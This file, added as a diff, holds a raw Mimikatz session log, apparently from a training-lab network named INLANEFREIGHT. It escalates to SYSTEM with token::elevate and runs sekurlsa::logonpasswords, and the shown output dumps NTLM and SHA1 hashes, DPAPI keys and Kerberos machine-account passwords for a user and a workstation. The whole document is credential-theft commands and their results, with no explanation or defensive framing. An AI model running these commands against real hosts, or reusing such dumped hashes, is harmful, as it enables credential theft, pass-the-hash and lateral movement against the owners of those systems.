@@ -1,0 +1,340 @@
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+652     {0;000003e7} 1 D 41798          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;002dec40} 2 F 4979083     INLANEFREIGHT\vfrank    S-1-5-21-3858284412-1730064152-742000644-1103   (14g,25p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 5036589     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 3010375 (00000000:002def47)
+Session           : RemoteInteractive from 2
+User Name         : vfrank
+Domain            : INLANEFREIGHT
+Logon Server      : ACADEMY-PIVOT-D
+Logon Time        : 4/23/2026 5:53:54 PM
+SID               : S-1-5-21-3858284412-1730064152-742000644-1103
+        msv :
+         [00000003] Primary
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
+         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
+         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
+        tspkg :
+        wdigest :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 3009600 (00000000:002dec40)
+Session           : RemoteInteractive from 2
+User Name         : vfrank
+Domain            : INLANEFREIGHT
+Logon Server      : ACADEMY-PIVOT-D
+Logon Time        : 4/23/2026 5:53:54 PM
+SID               : S-1-5-21-3858284412-1730064152-742000644-1103
+        msv :
+         [00000003] Primary
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
+         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
+         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
+        tspkg :
+        wdigest :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 2981782 (00000000:002d7f96)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2026 5:53:53 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 1c460395c9ed5992e198901a0e565fd4
+         * SHA1     : fae3c49110ac4ff33ad5b4e2a210728ec5b484c6
+        tspkg :
+        wdigest :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : be 72 e5 02 32 1e 00 91 99 f8 c9 31 73 94 bd 72 0a 62 29 98 b6 f8 72 cb c3 3c c1 17 05 fd ad a3 30 30 1c 82 a0 90 83 2e 65 62 b1 66 0c 72 f0 5f c5 2d 85 9a 17 fc 2a 5b 9a 24 19 00 43 63 45 ca c4 e1 82 df 26 ff b9 8d 19 32 6c dd 0e 8a a8 06 ec 95 c4 e8 68 6d ac db 65 5a c3 64 62 41 a6 d3 0e 4f 0b 7e 5d 38 80 e9 ac ef d8 3e 2b 39 ab a9 3a aa d8 46 ac 02 7e ba c2 30 87 c5 4d f1 e6 83 8a 46 53 0a 70 c2 b4 63 99 20 6f 5e 97 73 cf 34 82 87 53 d4 f2 14 65 3c 34 30 18 83 80 0c e7 9b de e5 54 67 31 19 e0 ab b2 64 be 0d de 73 7b 13 85 a0 6b c9 d6 e2 14 4f 93 db 9f 17 ae 7d 4f 21 74 e9 23 51 60 a3 44 0e 01 6d 03 8d 17 fc 35 c4 8a 5c 61 65 c4 de cb 62 ee 77 5f 86 61 c8 e8 38 fe 5c fa 7a 13 f3 8b 43 79 a0 a7 77 25 bb 71 dd
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 2981754 (00000000:002d7f7a)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2026 5:53:53 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 1c460395c9ed5992e198901a0e565fd4
+         * SHA1     : fae3c49110ac4ff33ad5b4e2a210728ec5b484c6
+        tspkg :
+        wdigest :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : be 72 e5 02 32 1e 00 91 99 f8 c9 31 73 94 bd 72 0a 62 29 98 b6 f8 72 cb c3 3c c1 17 05 fd ad a3 30 30 1c 82 a0 90 83 2e 65 62 b1 66 0c 72 f0 5f c5 2d 85 9a 17 fc 2a 5b 9a 24 19 00 43 63 45 ca c4 e1 82 df 26 ff b9 8d 19 32 6c dd 0e 8a a8 06 ec 95 c4 e8 68 6d ac db 65 5a c3 64 62 41 a6 d3 0e 4f 0b 7e 5d 38 80 e9 ac ef d8 3e 2b 39 ab a9 3a aa d8 46 ac 02 7e ba c2 30 87 c5 4d f1 e6 83 8a 46 53 0a 70 c2 b4 63 99 20 6f 5e 97 73 cf 34 82 87 53 d4 f2 14 65 3c 34 30 18 83 80 0c e7 9b de e5 54 67 31 19 e0 ab b2 64 be 0d de 73 7b 13 85 a0 6b c9 d6 e2 14 4f 93 db 9f 17 ae 7d 4f 21 74 e9 23 51 60 a3 44 0e 01 6d 03 8d 17 fc 35 c4 8a 5c 61 65 c4 de cb 62 ee 77 5f 86 61 c8 e8 38 fe 5c fa 7a 13 f3 8b 43 79 a0 a7 77 25 bb 71 dd
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 2977429 (00000000:002d6e95)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2026 5:53:53 PM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 1c460395c9ed5992e198901a0e565fd4
+         * SHA1     : fae3c49110ac4ff33ad5b4e2a210728ec5b484c6
+        tspkg :
+        wdigest :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : be 72 e5 02 32 1e 00 91 99 f8 c9 31 73 94 bd 72 0a 62 29 98 b6 f8 72 cb c3 3c c1 17 05 fd ad a3 30 30 1c 82 a0 90 83 2e 65 62 b1 66 0c 72 f0 5f c5 2d 85 9a 17 fc 2a 5b 9a 24 19 00 43 63 45 ca c4 e1 82 df 26 ff b9 8d 19 32 6c dd 0e 8a a8 06 ec 95 c4 e8 68 6d ac db 65 5a c3 64 62 41 a6 d3 0e 4f 0b 7e 5d 38 80 e9 ac ef d8 3e 2b 39 ab a9 3a aa d8 46 ac 02 7e ba c2 30 87 c5 4d f1 e6 83 8a 46 53 0a 70 c2 b4 63 99 20 6f 5e 97 73 cf 34 82 87 53 d4 f2 14 65 3c 34 30 18 83 80 0c e7 9b de e5 54 67 31 19 e0 ab b2 64 be 0d de 73 7b 13 85 a0 6b c9 d6 e2 14 4f 93 db 9f 17 ae 7d 4f 21 74 e9 23 51 60 a3 44 0e 01 6d 03 8d 17 fc 35 c4 8a 5c 61 65 c4 de cb 62 ee 77 5f 86 61 c8 e8 38 fe 5c fa 7a 13 f3 8b 43 79 a0 a7 77 25 bb 71 dd
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/23/2026 3:58:17 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 77752 (00000000:00012fb8)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2026 3:58:17 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 23ff0ecf33a6214f01b830f02c709d3a
+         * SHA1     : a885c756b081a1ad374604bcf4ada2f4a6723730
+        tspkg :
+        wdigest :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : 1V5uE51pS\Xr* G`Z[)2csm AFjwD,=W8d_3`DJsP(Ne&XAPRAnjZ` Io-e\p5VYdHTzz(qawW0aM\EIdCY4-RJ\.bv/UI#GSNYxyE44Sa,"R4"\]gSjMZMj
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 77729 (00000000:00012fa1)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2026 3:58:17 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 1c460395c9ed5992e198901a0e565fd4
+         * SHA1     : fae3c49110ac4ff33ad5b4e2a210728ec5b484c6
+        tspkg :
+        wdigest :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : be 72 e5 02 32 1e 00 91 99 f8 c9 31 73 94 bd 72 0a 62 29 98 b6 f8 72 cb c3 3c c1 17 05 fd ad a3 30 30 1c 82 a0 90 83 2e 65 62 b1 66 0c 72 f0 5f c5 2d 85 9a 17 fc 2a 5b 9a 24 19 00 43 63 45 ca c4 e1 82 df 26 ff b9 8d 19 32 6c dd 0e 8a a8 06 ec 95 c4 e8 68 6d ac db 65 5a c3 64 62 41 a6 d3 0e 4f 0b 7e 5d 38 80 e9 ac ef d8 3e 2b 39 ab a9 3a aa d8 46 ac 02 7e ba c2 30 87 c5 4d f1 e6 83 8a 46 53 0a 70 c2 b4 63 99 20 6f 5e 97 73 cf 34 82 87 53 d4 f2 14 65 3c 34 30 18 83 80 0c e7 9b de e5 54 67 31 19 e0 ab b2 64 be 0d de 73 7b 13 85 a0 6b c9 d6 e2 14 4f 93 db 9f 17 ae 7d 4f 21 74 e9 23 51 60 a3 44 0e 01 6d 03 8d 17 fc 35 c4 8a 5c 61 65 c4 de cb 62 ee 77 5f 86 61 c8 e8 38 fe 5c fa 7a 13 f3 8b 43 79 a0 a7 77 25 bb 71 dd
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : PIVOTWIN10$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 4/23/2026 3:58:16 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 1c460395c9ed5992e198901a0e565fd4
+         * SHA1     : fae3c49110ac4ff33ad5b4e2a210728ec5b484c6
+        tspkg :
+        wdigest :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : pivotwin10$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : be 72 e5 02 32 1e 00 91 99 f8 c9 31 73 94 bd 72 0a 62 29 98 b6 f8 72 cb c3 3c c1 17 05 fd ad a3 30 30 1c 82 a0 90 83 2e 65 62 b1 66 0c 72 f0 5f c5 2d 85 9a 17 fc 2a 5b 9a 24 19 00 43 63 45 ca c4 e1 82 df 26 ff b9 8d 19 32 6c dd 0e 8a a8 06 ec 95 c4 e8 68 6d ac db 65 5a c3 64 62 41 a6 d3 0e 4f 0b 7e 5d 38 80 e9 ac ef d8 3e 2b 39 ab a9 3a aa d8 46 ac 02 7e ba c2 30 87 c5 4d f1 e6 83 8a 46 53 0a 70 c2 b4 63 99 20 6f 5e 97 73 cf 34 82 87 53 d4 f2 14 65 3c 34 30 18 83 80 0c e7 9b de e5 54 67 31 19 e0 ab b2 64 be 0d de 73 7b 13 85 a0 6b c9 d6 e2 14 4f 93 db 9f 17 ae 7d 4f 21 74 e9 23 51 60 a3 44 0e 01 6d 03 8d 17 fc 35 c4 8a 5c 61 65 c4 de cb 62 ee 77 5f 86 61 c8 e8 38 fe 5c fa 7a 13 f3 8b 43 79 a0 a7 77 25 bb 71 dd
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 47707 (00000000:0000ba5b)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2026 3:58:16 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 1c460395c9ed5992e198901a0e565fd4
+         * SHA1     : fae3c49110ac4ff33ad5b4e2a210728ec5b484c6
+        tspkg :
+        wdigest :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : be 72 e5 02 32 1e 00 91 99 f8 c9 31 73 94 bd 72 0a 62 29 98 b6 f8 72 cb c3 3c c1 17 05 fd ad a3 30 30 1c 82 a0 90 83 2e 65 62 b1 66 0c 72 f0 5f c5 2d 85 9a 17 fc 2a 5b 9a 24 19 00 43 63 45 ca c4 e1 82 df 26 ff b9 8d 19 32 6c dd 0e 8a a8 06 ec 95 c4 e8 68 6d ac db 65 5a c3 64 62 41 a6 d3 0e 4f 0b 7e 5d 38 80 e9 ac ef d8 3e 2b 39 ab a9 3a aa d8 46 ac 02 7e ba c2 30 87 c5 4d f1 e6 83 8a 46 53 0a 70 c2 b4 63 99 20 6f 5e 97 73 cf 34 82 87 53 d4 f2 14 65 3c 34 30 18 83 80 0c e7 9b de e5 54 67 31 19 e0 ab b2 64 be 0d de 73 7b 13 85 a0 6b c9 d6 e2 14 4f 93 db 9f 17 ae 7d 4f 21 74 e9 23 51 60 a3 44 0e 01 6d 03 8d 17 fc 35 c4 8a 5c 61 65 c4 de cb 62 ee 77 5f 86 61 c8 e8 38 fe 5c fa 7a 13 f3 8b 43 79 a0 a7 77 25 bb 71 dd
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 47701 (00000000:0000ba55)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2026 3:58:16 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 1c460395c9ed5992e198901a0e565fd4
+         * SHA1     : fae3c49110ac4ff33ad5b4e2a210728ec5b484c6
+        tspkg :
+        wdigest :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : be 72 e5 02 32 1e 00 91 99 f8 c9 31 73 94 bd 72 0a 62 29 98 b6 f8 72 cb c3 3c c1 17 05 fd ad a3 30 30 1c 82 a0 90 83 2e 65 62 b1 66 0c 72 f0 5f c5 2d 85 9a 17 fc 2a 5b 9a 24 19 00 43 63 45 ca c4 e1 82 df 26 ff b9 8d 19 32 6c dd 0e 8a a8 06 ec 95 c4 e8 68 6d ac db 65 5a c3 64 62 41 a6 d3 0e 4f 0b 7e 5d 38 80 e9 ac ef d8 3e 2b 39 ab a9 3a aa d8 46 ac 02 7e ba c2 30 87 c5 4d f1 e6 83 8a 46 53 0a 70 c2 b4 63 99 20 6f 5e 97 73 cf 34 82 87 53 d4 f2 14 65 3c 34 30 18 83 80 0c e7 9b de e5 54 67 31 19 e0 ab b2 64 be 0d de 73 7b 13 85 a0 6b c9 d6 e2 14 4f 93 db 9f 17 ae 7d 4f 21 74 e9 23 51 60 a3 44 0e 01 6d 03 8d 17 fc 35 c4 8a 5c 61 65 c4 de cb 62 ee 77 5f 86 61 c8 e8 38 fe 5c fa 7a 13 f3 8b 43 79 a0 a7 77 25 bb 71 dd
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 46566 (00000000:0000b5e6)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/23/2026 3:58:16 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 1c460395c9ed5992e198901a0e565fd4
+         * SHA1     : fae3c49110ac4ff33ad5b4e2a210728ec5b484c6
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : PIVOTWIN10$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 4/23/2026 3:58:16 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : PIVOTWIN10$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : pivotwin10$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : be 72 e5 02 32 1e 00 91 99 f8 c9 31 73 94 bd 72 0a 62 29 98 b6 f8 72 cb c3 3c c1 17 05 fd ad a3 30 30 1c 82 a0 90 83 2e 65 62 b1 66 0c 72 f0 5f c5 2d 85 9a 17 fc 2a 5b 9a 24 19 00 43 63 45 ca c4 e1 82 df 26 ff b9 8d 19 32 6c dd 0e 8a a8 06 ec 95 c4 e8 68 6d ac db 65 5a c3 64 62 41 a6 d3 0e 4f 0b 7e 5d 38 80 e9 ac ef d8 3e 2b 39 ab a9 3a aa d8 46 ac 02 7e ba c2 30 87 c5 4d f1 e6 83 8a 46 53 0a 70 c2 b4 63 99 20 6f 5e 97 73 cf 34 82 87 53 d4 f2 14 65 3c 34 30 18 83 80 0c e7 9b de e5 54 67 31 19 e0 ab b2 64 be 0d de 73 7b 13 85 a0 6b c9 d6 e2 14 4f 93 db 9f 17 ae 7d 4f 21 74 e9 23 51 60 a3 44 0e 01 6d 03 8d 17 fc 35 c4 8a 5c 61 65 c4 de cb 62 ee 77 5f 86 61 c8 e8 38 fe 5c fa 7a 13 f3 8b 43 79 a0 a7 77 25 bb 71 dd
+        ssp :
+        credman :
+        cloudap :
+
+mimikatz #
